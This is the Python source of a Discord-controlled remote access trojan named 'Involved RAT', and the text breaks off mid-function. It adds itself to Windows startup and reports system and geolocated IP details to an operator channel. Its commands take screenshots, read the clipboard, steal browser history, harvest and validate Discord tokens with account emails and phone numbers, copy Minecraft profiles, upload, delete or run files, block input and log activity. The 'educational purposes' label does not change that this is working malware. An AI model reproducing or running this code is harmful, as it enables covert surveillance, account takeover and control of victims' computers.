# // Settings 
Token = ''
AutoAddToStartup = True

# // Misc
Version = '1.0'

# // Dependencies 
import subprocess
import random
import threading
import discord 
import string
import os
import platform
import time
import pyautogui
import re 
import win32clipboard
import pygame
import pygame.camera
import psutil
import shutil
import ctypes
import requests
import mss
import comtypes
import sys
import win32gui
import pymsgbox
import pycaw
import browserhistory as bh
import win32com.client as wincl
from cryptography.fernet import Fernet
from pycaw import *
from datetime import datetime
from discord.ext import commands

# // Variables 
Bot = commands.Bot(command_prefix = '.')
Appdata = os.getenv('APPDATA')
Temp = os.getenv('TEMP')
Local = os.getenv('LOCALAPPDATA')
rSession = requests.Session()

# // Utility
def GetSize(Bytes):
    Factor = 1024
    for Unit in ["", "K", "M", "G", "T", "P"]:
        if Bytes < Factor:
            return f'{Bytes:.2f}{Unit}B'
        Bytes /= Factor

def SystemInformation():
    try:
        # // Variables 
        SystemInformation = {}
        
        # // General
        Uname = platform.uname()
        SystemInformation['System'] = Uname.system
        SystemInformation['Name'] = Uname.node
        SystemInformation['Release'] = Uname.release
        SystemInformation['Version'] = Uname.version
        SystemInformation['Machine'] = Uname.machine

        # // Boot Time
        RawBootTime = psutil.boot_time()
        SystemInformation['Boot-Time'] = datetime.fromtimestamp(RawBootTime)

        # // CPU Information
        SystemInformation['Physical-Cores'] = psutil.cpu_count(logical=False)
        SystemInformation['Total-Cores'] = psutil.cpu_count(logical=True)
        SystemInformation['Max-Frequency'] = str(psutil.cpu_freq().max) + 'MHz'
        SystemInformation['Min-Frequency'] = str(psutil.cpu_freq().min) + 'MHz'
        SystemInformation['Current-Frequency'] = psutil.cpu_freq().current
        SystemInformation['Total-CPU-Usage'] = str(psutil.cpu_percent()) + '%'

        # // Memory Information
        SystemInformation['Total-Memory'] = GetSize(psutil.virtual_memory().total)
        SystemInformation['Available-Memory'] = GetSize(psutil.virtual_memory().available)
        SystemInformation['Used-Memory'] = GetSize(psutil.virtual_memory().used)
        SystemInformation['Percentage'] = GetSize(psutil.virtual_memory().percent) + '%'
        
        # // Network Information
        SystemInformation['Total-Bytes-Sent'] = GetSize(psutil.net_io_counters().bytes_sent)
        SystemInformation['Total-Bytes-Received'] = GetSize(psutil.net_io_counters().bytes_recv)

        return SystemInformation
    
    except Exception as E:
        return E

def IPInformation():
    IPInformation = {}

    Url = 'http://ip-api.com/json/'
    Request = rSession.get(Url)
    Data = Request.json()

    if Request.status_code == 200: 
        IPInformation['IP-Address'] = Data['query']
        IPInformation['AS'] = Data['as']
        IPInformation['Organisation'] = Data['org']
        IPInformation['ISP'] = Data['isp'] 
        IPInformation['Country'] = Data['country']
        IPInformation['Country-Code'] = Data['countryCode']
        IPInformation['Region'] = Data['region']
        IPInformation['Region-Name'] = Data['regionName']
        IPInformation['City'] = Data['city']
        IPInformation['Postcode'] = Data['zip']
        IPInformation['Latitude'] = Data['lat']
        IPInformation['Longitude'] = Data['lon'] 
        
        return IPInformation

def IsAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# // Startup
if AutoAddToStartup == True: 
    if os.path.exists(Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0])):
        pass 
    else:
        shutil.copy(sys.argv[0], Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')

# // Main
@Bot.event
async def on_ready():
    Message = f"Involved RAT | .cmds For Help | Version: {Version} | Educational Purposes Only!"
    Game = discord.Game(Message)
    await Bot.change_presence(status = discord.Status.online, activity = Game)

    SystemInfo = SystemInformation()
    IPInfo = IPInformation()

    RandomString = ''.join(random.choices(string.ascii_lowercase + string.digits, k = 6))
    Name = 'session-' + RandomString
    global SessionName
    SessionName = Name

    await Bot.guilds[0].create_text_channel(Name)
    ChannelObject = discord.utils.get(Bot.get_all_channels(), name = Name)
    Channel = Bot.get_channel(ChannelObject.id)

    General = f'System: `{SystemInfo["System"]}`\nName: `{SystemInfo["Name"]}`\nRelease: `{SystemInfo["Release"]}`\nVersion: `{SystemInfo["Version"]}`\nMachine: `{SystemInfo["Machine"]}`'
    BootTime = f'Boot Time: `{SystemInfo["Boot-Time"]}`'
    CPUInformation = f'Physical Cores: `{SystemInfo["Physical-Cores"]}`\nTotal Cores: `{SystemInfo["Total-Cores"]}`\nMax Frequency: `{SystemInfo["Max-Frequency"]}`\nMin Frequency: `{SystemInfo["Min-Frequency"]}`\nCurrent Frequency: `{SystemInfo["Current-Frequency"]}`\nTotal CPU Usage: `{SystemInfo["Total-CPU-Usage"]}`'
    MemoryInformation = f'Total Memory: `{SystemInfo["Total-Memory"]}`\nAvailable Memory: `{SystemInfo["Available-Memory"]}`\nUsed Memory: `{SystemInfo["Used-Memory"]}`\nPercentage: `{SystemInfo["Percentage"]}`'
    NetworkInformation = f'Total Bytes Sent: `{SystemInfo["Total-Bytes-Sent"]}`\nTotal Bytes Received: `{SystemInfo["Total-Bytes-Received"]}`'
    IPInformationx = f'IP Address: `{IPInfo["IP-Address"]}`\nAS: `{IPInfo["AS"]}`\nOrganisation: `{IPInfo["Organisation"]}`\nISP: `{IPInfo["ISP"]}`\nCountry: `{IPInfo["Country"]}`\nCountry Code: `{IPInfo["Country-Code"]}`\nRegion: `{IPInfo["Region"]}`\nRegion Name: `{IPInfo["Region-Name"]}`\nCity: `{IPInfo["City"]}`\nPostcode: `{IPInfo["Postcode"]}`\nLatitude: `{IPInfo["Latitude"]}`\nLongitude: `{IPInfo["Longitude"]}`'

    if IsAdmin() == True:
        Embed = discord.Embed(
            title = f'[!] New Session Opened',
            description = f'Administrator: `False`',
            colour = discord.Colour.purple()
        )
        Embed.add_field(
            name = 'General',
            value = General,
            inline = False
        )
        Embed.add_field(
            name = 'Boot Time',
            value = BootTime,
            inline = False
        )
        Embed.add_field(
            name = 'CPU Information',
            value = CPUInformation,
            inline = False
        )
        Embed.add_field(
            name = 'Memory Information',
            value = MemoryInformation,
            inline = False
        )
        Embed.add_field(
            name = 'Network Information',
            value = NetworkInformation,
            inline = False
        )
        Embed.add_field(
            name = 'Network Information',
            value = NetworkInformation,
            inline = False
        )
        Embed.add_field(
            name = 'IP Information',
            value = IPInformationx,
            inline = False
        )
        Embed.set_footer(text = f'Date: {datetime.utcnow()}')
        await Channel.send('@everyone', embed = Embed)
    else: 
        Embed = discord.Embed(
            title = f'[!] New Session Opened',
            description = f'Administrator: `True`',
            colour = discord.Colour.purple()
        )
        Embed.add_field(
            name = 'General',
            value = General,
            inline = False
        )
        Embed.add_field(
            name = 'Boot Time',
            value = BootTime,
            inline = False
        )
        Embed.add_field(
            name = 'CPU Information',
            value = CPUInformation,
            inline = False
        )
        Embed.add_field(
            name = 'Memory Information',
            value = MemoryInformation,
            inline = False
        )
        Embed.add_field(
            name = 'Network Information',
            value = NetworkInformation,
            inline = False
        )
        Embed.add_field(
            name = 'Network Information',
            value = NetworkInformation,
            inline = False
        )
        Embed.add_field(
            name = 'IP Information',
            value = IPInformationx,
            inline = False
        )
        Embed.set_footer(text = f'Date: {datetime.utcnow()}')
        await Channel.send('@everyone', embed = Embed)
    
    if AutoAddToStartup == True:
        Embed = discord.Embed(
            title = f'',
            description = f'[!] Successfully Added RAT To Startup.',
            colour = discord.Colour.purple()
        )
        await Channel.send(embed = Embed)


@Bot.command(aliases=['exit'])
async def _exit(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'Successfully Exited The Program.',
                description = f'',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            os._exit(0)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def startup(ctx):
    if ctx.channel.name == SessionName:
        try:
            shutil.copy(sys.argv[0], Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
            Embed = discord.Embed(
                title = f'[!] Successfully Added RAT To Startup.',
                description = f'',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def screenshot(ctx, MonitorNumber):
    if ctx.channel.name == SessionName:
        try:
            with mss.mss() as sct:
                Screenshot = sct.shot(mon = int(MonitorNumber), output = Temp + '\\Screenshot.png')
            File = discord.File(os.path.join(Temp + '\\Screenshot.png'), filename = 'Screenshot.png')
            Embed = discord.Embed(
                title = f'[!] Successfully Took Screenshot.',
                description = f'',
                colour = discord.Colour.purple()
            )
            Embed.set_image(url = f'attachment://Screenshot.png')
            await ctx.send(f'<@!{ctx.author.id}>', file = File, embed = Embed)
            os.remove(Temp + '\\Screenshot.png')
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
    

@Bot.command()
async def readclipboard(ctx):
    if ctx.channel.name == SessionName:
        try:
            win32clipboard.OpenClipboard()
            Data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            Embed = discord.Embed(
                title = f'[!] Read Clipboard Successfully.',
                description = f'{Data}',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def setclipboard(ctx, *, Data):
    if ctx.channel.name == SessionName:
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(Data)
            win32clipboard.CloseClipboard()
            Embed = discord.Embed(
                title = f'[!] Set Clipboard Successfully.',
                description = f'{Data}',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def clearclipboard(ctx):
    if ctx.channel.name == SessionName:
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.CloseClipboard()
            Embed = discord.Embed(
                title = f'',
                description = f'[!] Successfully Emptied Clipboard.',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def ipinfo(ctx):
    if ctx.channel.name == SessionName:
        try:
            IPInfo = IPInformation()
            IPInformationx = f'IP Address: `{IPInfo["IP-Address"]}`\nAS: `{IPInfo["AS"]}`\nOrganisation: `{IPInfo["Organisation"]}`\nISP: `{IPInfo["ISP"]}`\nCountry: `{IPInfo["Country"]}`\nCountry Code: `{IPInfo["Country-Code"]}`\nRegion: `{IPInfo["Region"]}`\nRegion Name: `{IPInfo["Region-Name"]}`\nCity: `{IPInfo["City"]}`\nPostcode: `{IPInfo["Postcode"]}`\nLatitude: `{IPInfo["Latitude"]}`\nLongitude: `{IPInfo["Longitude"]}`'

            Embed = discord.Embed(
                title = f'[!] Successfully Got IP Information',
                description = f'',
                colour = discord.Colour.purple()
            )
            Embed.add_field(
                name = 'IP Information',
                value = IPInformationx,
                inline = False
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def systeminfo(ctx):
    if ctx.channel.name == SessionName:
        try:
            SystemInfo = SystemInformation()
            General = f'System: `{SystemInfo["System"]}`\nName: `{SystemInfo["Name"]}`\nRelease: `{SystemInfo["Release"]}`\nVersion: `{SystemInfo["Version"]}`\nMachine: `{SystemInfo["Machine"]}`'
            BootTime = f'Boot Time: `{SystemInfo["Boot-Time"]}`'
            CPUInformation = f'Physical Cores: `{SystemInfo["Physical-Cores"]}`\nTotal Cores: `{SystemInfo["Total-Cores"]}`\nMax Frequency: `{SystemInfo["Max-Frequency"]}`\nMin Frequency: `{SystemInfo["Min-Frequency"]}`\nCurrent Frequency: `{SystemInfo["Current-Frequency"]}`\nTotal CPU Usage: `{SystemInfo["Total-CPU-Usage"]}`'
            MemoryInformation = f'Total Memory: `{SystemInfo["Total-Memory"]}`\nAvailable Memory: `{SystemInfo["Available-Memory"]}`\nUsed Memory: `{SystemInfo["Used-Memory"]}`\nPercentage: `{SystemInfo["Percentage"]}`'
            NetworkInformation = f'Total Bytes Sent: `{SystemInfo["Total-Bytes-Sent"]}`\nTotal Bytes Received: `{SystemInfo["Total-Bytes-Received"]}`'

            Embed = discord.Embed(
                title = f'[!] Successfully Got System Information',
                description = f'',
                colour = discord.Colour.purple()
            )
            Embed.add_field(
                name = 'General',
                value = General,
                inline = False
            )
            Embed.add_field(
                name = 'Boot Time',
                value = BootTime,
                inline = False
            )
            Embed.add_field(
                name = 'CPU Information',
                value = CPUInformation,
                inline = False
            )
            Embed.add_field(
                name = 'Memory Information',
                value = MemoryInformation,
                inline = False
            )
            Embed.add_field(
                name = 'Network Information',
                value = NetworkInformation,
                inline = False
            )
            Embed.add_field(
                name = 'Network Information',
                value = NetworkInformation,
                inline = False
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def browserhistory(ctx):
    if ctx.channel.name == SessionName:
        try:
            for Process in psutil.process_iter():
                if Process.name() == 'chrome.exe':
                    Process.kill()
            Dict = bh.get_browserhistory()
            Str = str(Dict).encode(errors = 'ignore')
            with open(Temp + '\\History.txt', 'w') as History:
                History.write(str(Str))
            File = discord.File(Temp + '\\History.txt', filename = 'History.txt')
            Embed = discord.Embed(
                title = f'[!] Successfully Got Browser History.',
                description = f'',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', file = File, embed = Embed)
            os.remove(Temp + '\\History.txt')
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['type'])
async def _type(ctx, *, Text):
    if ctx.channel.name == SessionName:
        try:
            pyautogui.typewrite(Text)
            Embed = discord.Embed(
                title = f"!] Successfully Typed Text.",
                description = f'Text: `{Text}`',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
    
@Bot.command()
async def say(ctx, *, Text):
    if ctx.channel.name == SessionName:
        try:
            Voice = wincl.Dispatch("SAPI.SpVoice")
            Voice.Speak(Text)
            comtypes.CoUninitialize()
            Embed = discord.Embed(
                title = f"[!] Successfully Played Text.",
                description = f'Text: `{Text}`',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def setvolume(ctx, *, Decibels):
    if ctx.channel.name == SessionName:
        try:
            Sessions = pycaw.AudioUtilities.GetAllSessions()
            for Session in Sessions:
                Interface = Session.SimpleAudioVolume
                Volume = min(1.0, max(0.0, float(Decibels)))
                Interface.SetMasterVolume(Volume, None)
            Embed = discord.Embed(
                title = f'[!] Successfully Changed Volume.',
                description = f'',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def decreasevolume(ctx, *, Decibels):
    if ctx.channel.name == SessionName:
        try:
            Sessions = pycaw.AudioUtilities.GetAllSessions()
            for Session in Sessions:
                Interface = Session.SimpleAudioVolume
                Current = Interface.GetMasterVolume()
                Volume = max(0.0, Current - float(Decibels))
                Interface.SetMasterVolume(Volume, None)
            Embed = discord.Embed(
                title = f'[!] Successfully Decreased Volume.',
                description = f'Decibels: `{Decibels}`',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def increasevolume(ctx, *, Decibels):
    if ctx.channel.name == SessionName:
        try:
            Sessions = pycaw.AudioUtilities.GetAllSessions()
            for Session in Sessions:
                Interface = Session.SimpleAudioVolume
                Current = Interface.GetMasterVolume()
                Volume = max(0.0, Current + float(Decibels))
                Interface.SetMasterVolume(Volume, None)
            Embed = discord.Embed(
                title = f'[!] Successfully Increased Volume.',
                description = f'Decibels: `{Decibels}`',
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def mute(ctx):
    if ctx.channel.name == SessionName:
        try:
            Sessions = pycaw.AudioUtilities.GetAllSessions()
            for Session in Sessions:
                Interface = Session.SimpleAudioVolume
                Interface.SetMute(1, None)
            Embed = discord.Embed(
                title = f"[!] Successfully Muted.",
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def unmute(ctx):
    if ctx.channel.name == SessionName:
        try:
            Sessions = pycaw.AudioUtilities.GetAllSessions()
            for Session in Sessions:
                Interface = Session.SimpleAudioVolume
                Interface.SetMute(0, None)
            Embed = discord.Embed(
                title = f"[!] Successfully Unmuted.",
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def messagebox(ctx, Title, Text):
    if ctx.channel.name == SessionName:
        try: 
            Embed = discord.Embed(
                title = f'[!] Successfully Showed Message Box.',
                description = f"Title: `{Title}`\nText: `{Text}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            pymsgbox.alert(Text, Title)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def exitprogram(ctx, ProcessName):
    if ctx.channel.name == SessionName:
        try:
            for Process in psutil.process_iter():
                if Process.name() == ProcessName:
                    Process.kill()
            Embed = discord.Embed(
                title = f'[!] Successfully Closed Program:',
                description = f"`{ProcessName}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def openprogram(ctx, Path):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Successfully Opened Program:',
                description = f"`{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            subprocess.call([Path])
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)


@Bot.command()
async def blockinput(ctx):
    if ctx.channel.name == SessionName:
        try:
            Admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if Admin == True:
                ctypes.windll.user32.BlockInput(True)
                Embed = discord.Embed(
                    title = f'[!] Successfully Blocked Input.',
                    description = f"",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            else: 
                Embed = discord.Embed(
                    title = f'[!] Error.',
                    description = f"`[!] Administrator Permissions Are Needed For This Command.`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def unblockinput(ctx):
    if ctx.channel.name == SessionName:
        try:
            Admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if Admin == True:
                ctypes.windll.user32.BlockInput(False)
                Embed = discord.Embed(
                    title = f'[!] Successfully Unblocked Input.',
                    description = f"",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            else: 
                Embed = discord.Embed(
                    title = f'[!] Error.',
                    description = f"`[!] Administrator Permissions Are Needed For This Command.`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def discordtokens(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Finding Tokens',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(embed = Embed)

            Locations = {
                'Discord': Appdata + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': Appdata + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': Appdata + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': Appdata + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': Appdata + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': Appdata + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': Local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': Local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': Local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': Local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': Local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': Local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': Local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': Local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': Local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': Local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': Local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': Local + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                'Uran': Local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': Local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': Local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': Local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }
            Tokens = []

            for Source, Path in Locations.items():
                if not os.path.exists(Path):
                    continue

                for File in os.listdir(Path):
                    if not File.endswith('.log') and not File.endswith('.ldb'):
                        continue

                    for Line in [a.strip() for a in open(f'{Path}\\{File}', errors='ignore').readlines() if a.strip()]:
                        for Regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for Token in re.findall(Regex, Line):
                                Headers = {
                                    "Content-Type": "application/json",
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                                    "Authorization": Token
                                }

                                Request = rSession.get("https://discord.com/api/v9/users/@me", headers = Headers)
                                Text = Request.text 

                                if not '401: Unauthorized' in Text:
                                    Data = Request.json()
                                    Info = f'User ID: {Data["id"]}\nName: {Data["username"]}#{Data["discriminator"]}\nAbout Me: {Data["bio"]}\nLocale: {Data["locale"]}\nMFA Enabled: {Data["mfa_enabled"]}\nEmail: {Data["email"]}\nPhone Number: {Data["phone"]}\nVerified: {Data["verified"]}\nToken: `{Token}`'
                                    Embed = discord.Embed(
                                        title = f'[!] Found Token',
                                        description = f"",
                                        colour = discord.Colour.purple()
                                    )
                                    Embed.add_field(
                                        name = f'Account Information',
                                        value = Info,
                                        inline = False
                                    )
                                    Embed.add_field(
                                        name = f'Location',
                                        value = f'`{Path}`',
                                        inline = False
                                    )
                                    Embed.set_thumbnail(url = f'https://cdn.discordapp.com/avatars/{Data["id"]}/{Data["avatar"]}.jpg')
                                    Embed.set_footer(text = f'Date: {datetime.utcnow()}')

                                    await ctx.send(embed = Embed)

                                    Tokens.append(Token)

            Embed = discord.Embed(
                title = f'[!] Found {len(Tokens)} Tokens.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def minecraftprofiles(ctx):
    if ctx.channel.name == SessionName:
        try:
            Path = Appdata + '\\.minecraft\\launcher_profiles.json'
            File = discord.File(Path, filename = 'launcher_profiles.json')
            Embed = discord.Embed(
                title = f'[!] Found Minecraft Profiles.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', file = File, embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def uploadfile(ctx, Name, *, Path):
    if ctx.channel.name == SessionName:
        try:
            await ctx.message.attachments[0].save(Name)
            FilePath = os.path.abspath(Name)
            shutil.copy(FilePath, Path)
            os.remove(FilePath)
            Embed = discord.Embed(
                title = f'[!] Successfully Uploaded File:',
                description = f"Path: `{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def deletefile(ctx, *, Path):
    if ctx.channel.name == SessionName:
        try:
            os.remove(Path)
            Embed = discord.Embed(
                title = f'[!] Successfully Removed File.',
                description = f"Path: `{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def startactivitylogger(ctx):
    if ctx.channel.name == SessionName:
        try:
            global Stop
            Stop = False 
            while True:
                if Stop == True:
                    break 
                Window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                Embed = discord.Embed(
                    title = f'[!] Active Window:',
                    description = Window,
                    colour = discord.Colour.purple()
                )
                await ctx.channel.send(embed = Embed)
                time.sleep(2.5)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def stopactivitylogger(ctx):
    if ctx.channel.name == SessionName:
        try:
            global Stop
            Stop = True
            Embed = discord.Embed(
                title = f'[!] Activity Logging Stopped.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def changewallpaper(ctx):
    if ctx.channel.name == SessionName:
        try:
            Path = Temp + '\\Wallpaper.jpg'
            await ctx.message.attachments[0].save(Path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, Path , 0)
            Embed = discord.Embed(
